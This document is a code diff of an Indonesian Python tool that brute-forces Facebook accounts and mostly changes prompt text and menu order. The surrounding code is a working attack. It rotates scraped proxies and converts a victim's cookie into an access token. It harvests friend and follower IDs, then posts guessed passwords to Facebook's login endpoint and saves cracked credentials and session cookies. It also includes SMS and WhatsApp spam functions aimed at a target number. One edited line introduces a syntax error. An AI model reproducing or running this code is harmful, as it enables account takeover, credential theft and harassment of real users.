@@ -68,7 +68,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print(' ╰─  Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD')
+	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
@@ -195,18 +195,21 @@ def banner():
 def login123():
 	os.system('clear')
 	banner()
-	cetak(panel(f"[01] Login Menggunakan Cookie [[bold green] ON [bold white]]             [03] Menu Bot Pada Script [[bold green] ON [bold white]]\n[02] Menu Crack Tanpa Login [[bold green] ON [bold white]]               [04] Cek Hasil Crack [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
-	bryn = input(f' ╰─  Pilih Menu : ')
+	cetak(panel(f"[01] Login Menggunakan Cookie [[bold green] ON [bold white]]\n[02] Doa Sebelum Crack [[bold green] ON [bold white]]\n[03] Cara Mengambil Cookies Facebook [[bold green] ON [bold white]]\n[04] Cek Hasil Crack [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
+	bryn = input(f' [+] Pilih Menu : ')
 	if bryn in ['1','01']:
 		login_lagi334()
 	elif bryn in ['2','02']:
-		lainnya()
+		doa_halal()
 	elif bryn in ['3','03']:
-		bot()
+		cetak(panel(f"Anda Akan Di Arahkan Ke Youtube,  Liat Lah Dengan Mata Kepala Anda Sendiri Bagaimana Mengambil Cookies Yang Benar Dan Ikut Tutorial Nya",width=90,title=f"[bold green]Report Bug",padding=(0,3),style=f"bold white"))
+		os.system("xdg-open https://youtu.be/iPs-ShFVOJA")
+		time.sleep(3)
+		exit()
 	elif bryn in ['4','04']:
 		result()
 	else:
-		print(' ╰─  Pilih Yang Bener Asu ')
+		print(' [+] Pilih Yang Bener Asu ')
 		time.sleep(5)
 		back()
 		
@@ -223,7 +226,7 @@ def login():
 		except KeyError:
 			login123()
 		except requests.exceptions.ConnectionError:
-			li = ' ╰─  Problem Internet Connection, Check And Try Again'
+			li = ' [+] Problem Internet Connection, Check And Try Again'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
@@ -233,7 +236,7 @@ def login():
 def login_lagi334():
 	try:
 		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
-		your_cookies = input(' ╰─  Cookie Facebook : ')
+		your_cookies = input(' [+] Cookie Facebook : ')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
@@ -245,7 +248,7 @@ def login_lagi334():
 				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
+					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
@@ -277,12 +280,12 @@ def login_lagi334():
 							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n ╰─  Token : {access_token}")
+							print(f"\n [+] Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\╰─ Login Berhasil | python run.py");exit()
+							print("\ [+] Login Berhasil | python run.py");exit()
 			except Exception as e:
-				print(" ╰─  Cookies Tidak Dapat Di Akses")
+				print(" [+] Cookies Tidak Dapat Di Akses")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
 				print(e)
 				time.sleep(3)
@@ -295,7 +298,7 @@ def menu(my_name,my_id):
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print(' ╰─  Cookies Kadaluarsa ')
+		print(' [+] Cookies Kadaluarsa ')
 		time.sleep(5)
 		login()
 	os.system('clear')
@@ -303,47 +306,51 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	cetak(panel(f'[bold white] Terima Kasih Kepada [bold green]XyzonXD[bold white] Yang Telah Recode Script Ini, Simple Multi Brute Facebook',width=90,style=f"bold white"))
 	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold white]Status   : [bold green]Premium ',width=90,title=f"[bold green]Infomasi",style=f"bold white"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick OR Friends [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack Email [[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek Result [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Cek Opsi Chekpoint [[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold white]Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold white]Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold white]Report Bug [[bold green] ON [bold white]]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick OR Friends [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack Email [[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek Result [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Cek Opsi Chekpoint [[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold white]Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold white]Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold white]Report Bug [[bold green] ON [bold white]]\n[bold white][[bold red]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	cetak(panel(f'[bold Red]Warning[bold white] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
-	_____brayennn___xd____ = input(f' ╰─ Pilih Menu Crack : ')
+	_____brayennn___xd____ = input(f' [bold white][[bold green]•[/][bold white]][/] [bold white]Pilih Menu Crack : ')
 	if _____brayennn___xd____ in ['1','01']:
 		brayen_dump()
 	elif _____brayennn___xd____ in ['2','02']:
 		dump_massal()
 	elif _____brayennn___xd____ in ['3','03']:
-		result()
-	elif _____brayennn___xd____ in('4','04'):
 		crack_nama()
+	elif _____brayennn___xd____ in('4','04'):
+		crack_file()
 	elif _____brayennn___xd____ in('5','05'):
 		pengikut()
 	elif _____brayennn___xd____ in('6','06'):
-		crack_file()
-	elif _____brayennn___xd____ in('7','07'):
 		crack_email()
+	elif _____brayennn___xd____ in('7','07'):
+		result()
 	elif _____brayennn___xd____ in('8','08'):
 		file_cp()
 	elif _____brayennn___xd____ in('9','09'):
-		spam_sms()
-	elif _____brayennn___xd____ in('10','10'):
 		spam_wa()
+	elif _____brayennn___xd____ in('10','10'):
+		spam_sms()
 	elif _____brayennn___xd____ in('11','11'):
 		cetak(panel(f"Apapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold green]Report Bug",padding=(0,3),style=f"bold white"))
 		os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
 		time.sleep(3)
 		exit()
-	elif _____brayennn___xd____ in ['0','00']:
+	elif _____brayennn___xd____ in['0','00'):
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print(f' ╰─  {m}Sukses Logout+Hapus Cookies{x}')
+		print(f' [+] {m}Sukses Logout+Hapus Cookies{x}')
 		time.sleep(5)
 		login()
 	else:
-		print(' ╰─  Pilih Yang Bener Asu ')
+		print(' [+] Pilih Yang Bener Asu ')
 		back()
 def error():
-	print(f' ╰─  Maaf Fitur Ini Masih Di Perbaiki')
+	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
 	time.sleep(4)
 	back() 
+#-------------------[ DOA HALAL ]-----------------------#
+def doa_halal():
+	cetak(nel(f'''{H2}[{K2}+{H2}] {H2}Versi Arab Stay Halal : {K2}  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
+{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : {K2}Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'{P2} {H2}[ {K2}Doa Sebelum Crack {H2}]',subtitle_align='center',padding=1,style='green'))
 #------------------[ DEFF SPAM SMS ]-------------------#
 
 agent = random.choice(
@@ -364,12 +371,12 @@ def process_data1():
 def spam_sms():
 	global nomor 
 	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" ╰─ Input No Hp : +62").replace("+62","")
+	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
 		while True:
-			for _ in track(range(100), description=f' ╰─  Sedang Spam...'):process_data1()
+			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
 			sxp_sms()
 
 class sxp_sms:
@@ -726,12 +733,12 @@ class sxp_sms:
 def spam_wa():
 	global nomor
 	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" ╰─ Input No Hp : +62").replace("+62","")
+	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
 		while True:
-			for _ in track(range(100), description=f' ╰─  Sedang Spam...'):process_data1()
+			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
 			sxp_wa()
 			
 class sxp_wa:
@@ -885,23 +892,23 @@ def pengikut():
 		exit()
 	ses = requests.Session()
 	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
-	akun = console.input(f' ╰─ Masukan Id Target : ')
+	akun = console.input(f' [+] Masukan Id Target : ')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
 			try:
 			    id.append(pi['id']+'|'+pi['name'])
-			    sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
 			    time.sleep(0.0002)
 			except:continue
 		print("\r")
 		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print(f" ╰─  Koneksi Internet Anda Bermasalah")
+		print(f" [+] Koneksi Internet Anda Bermasalah")
 		time.sleep(3);exit()
 	except (KeyError,IOError):
-		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
+		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
 		time.sleep(3);exit()
 
 #----------------------[ CRACK USERNAME ]----------------------#
@@ -910,7 +917,7 @@ def crack_nama():
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
 	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
-	nam = console.input(f' ╰─  Masukan Nama : ').split(",")
+	nam = console.input(f' [+] Masukan Nama : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
 			id = ser+belakang
@@ -937,7 +944,7 @@ def cari_nama(link):
 			else:id.append(bo)
 	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
 	if(link):
-	  sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
+	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
 	  time.sleep(0.0000003)
 	  cari_nama(link)
 	else:
@@ -950,17 +957,17 @@ def crack_email():
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
 	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
-	nama = console.input(f' ╰─ Masukan Nama Target : ')
+	nama = console.input(f' [+] Masukan Nama Target : ')
 	if ',' in str(nama):
-		print(f" ╰─  Masukan Nama, Jangan Kosong Ngab")
+		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
 		time.sleep(3);exit()
 	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
-	doma = console.input(f' ╰─  Masukan Nama Domain : ')
+	doma = console.input(f' [+] Masukan Nama Domain : ')
 	if '@' not in str(doma) or '.com' not in str(doma):
-		print(f" ╰─  Masukan Domain Dengan Benar")
+		print(f" [+] Masukan Domain Dengan Benar")
 		time.sleep(3);exit()
 	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
-	jumlah = console.input(f' ╰─  Total Dump : ')
+	jumlah = console.input(f' [+] Total Dump : ')
 	for xyz in range(int(jumlah)):
 		A = nama
 		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
@@ -969,7 +976,7 @@ def crack_email():
 		if D in id:pass
 		else:id.append(D+'|'+nama)
 		if len(dump)==999999:setting()
-		sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
 		time.sleep(0.0000003)
 	print("\r")
 	setting()	
@@ -978,11 +985,11 @@ def crack_email():
 def crack_file():
 	try:vin = os.listdir('DUMP')
 	except FileNotFoundError:
-		print(' ╰─  File Tidak Ditemukan ')
+		print(' [+] File Tidak Ditemukan ')
 		time.sleep(2)
 		back()
 	if len(vin)==0:
-		print(' ╰─  Kamu Tidak Memiliki File Dump ')
+		print(' [+] Kamu Tidak Memiliki File Dump ')
 		time.sleep(2)
 		back()
 	else:
@@ -1000,16 +1007,16 @@ def crack_file():
 			else:
 				lol.update({str(cih):str(isi)})
 				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print(' ╰─  %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input(' ╰─  Pilih : ')
+				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
+		geeh = input(' [+] Pilih : ')
 		try:geh = lol[geeh]
 		except KeyError:
-			print(f' ╰─  Pilih Yang Bener Kontol {x}')
+			print(f' [+] Pilih Yang Bener Kontol {x}')
 			time.sleep(3)
 			back()
 		try:lin = open('DUMP/'+geh,'r').read().splitlines()
 		except:
-			print(' ╰─  File Tidak Ditemukan, Coba Lagi Nanti ')
+			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
 			time.sleep(2)
 			back()
 		for xid in lin:
@@ -1018,15 +1025,15 @@ def crack_file():
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
-	kz = input(f'╰─ Pilih : ')
+	kz = input(f'[+]Pilih : ')
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print(' ╰─  File Tidak Di Temukan ')
+			print(' [+] File Tidak Di Temukan ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print(' ╰─  Anda Tidak Memiliki Hasil CP ')
+			print(' [+] Anda Tidak Memiliki Hasil CP ')
 			time.sleep(4)
 			back()
 		else:
@@ -1044,14 +1051,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')
+			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
 				print(' ╰─  Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print(' ╰─  File Tidak Di Temukan ')
+				print(' [+] File Tidak Di Temukan ')
 				time.sleep(4)
 				back()
 			nocp=0
@@ -1065,11 +1072,11 @@ def result():
 	elif kz in ['1','01']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print(' ╰─  File Tidak Di Temukan ')
+			print(' [+] File Tidak Di Temukan ')
 			time.sleep(4)
 			back()
 		if len(vin)==0:
-			print(' ╰─  Anda Tidak Mempunyai File OK ')
+			print(' [+] Anda Tidak Mempunyai File OK ')
 			time.sleep(4)
 			back()
 		else:
@@ -1087,14 +1094,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n ╰─  Pilih : ')
+			geeh = input('\n [+] Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' ╰─  Pilih Yang Bener Kontol ')
+				print(' [+] Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print(' ╰─  File Tidak Di Temukan ')
+				print(' [+] File Tidak Di Temukan ')
 				time.sleep(4)
 				back()
 			nocp=0
@@ -1119,20 +1126,20 @@ def brayen_dump():
 	except IOError:
 		exit()
 	cetak(panel('\t[bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
-	pil = input(f' ╰─ Masukan ID Target : ')
+	pil = input(f' [+] Masukan ID Target : ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koH['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
 		print('')
-		print(f' ╰─ Total ID yang Terkumpul : {h}'+str(len(id)))
+		print(f' [+] Total ID yang Terkumpul : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print(' ╰─  Internet Lu Gak Ada Anjing')
+		print(' [+] Internet Lu Gak Ada Anjing')
 		exit()
 	except (KeyError,IOError):
-		print(' ╰─ Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
+		print(' [+] Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
 		exit()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -1143,12 +1150,12 @@ def dump_massal():
 		exit()
 	try:
 		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
-		jum = int(input(f' ╰─ Mau Berapa Idz Target {x} : '))
+		jum = int(input(f' [+] Mau Berapa Idz Target {x} : '))
 	except ValueError:
-		print(' ╰─  Wrong input ')
+		print(' [+] Wrong input ')
 		exit()
 	if jum<1 or jum>80:
-		print(f'{h} ╰─  {x}Pertemanan Tidak Publik  ')
+		print(f'{h} [+] {x}Pertemanan Tidak Publik  ')
 		exit()
 	ses=requests.Session()
 	yz = 0
@@ -1168,17 +1175,17 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print(' ╰─  Unstable Signal ')
+			print(' [+] Unstable Signal ')
 			exit()
 	try:
-		print(f' ╰─  {P}Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
+		print(f' [+] {P}Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print(' ╰─  Unstable Signal ')
+		print(' [+] Unstable Signal ')
 		back()
 	except (KeyError,IOError):
-		print(f' ╰─  {k} Friendship Not Public {x}')
+		print(f' [+] {k} Friendship Not Public {x}')
 		time.sleep(3)
 		back()
 #-------------[ PENGATURAN-IDZ ]---------------#
@@ -1575,8 +1582,8 @@ def reguler2(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[bold yellow][CP]>{idf}|{pw}")
-				tree.add(f"[bold yellow][UA]>{ua}\n")
+				tree.add(f"[bold yellow]+--->{idf}|{pw}")
+				tree.add(f"[bold yellow]+--->{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1587,8 +1594,8 @@ def reguler2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[bold green][OK]>{idf}|{pw}")
-				tree.add(f"[bold green][CK]>{kuki}\n")
+				tree.add(f"[bold green]+--->{idf}|{pw}")
+				tree.add(f"[bold green]+--->{kuki}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
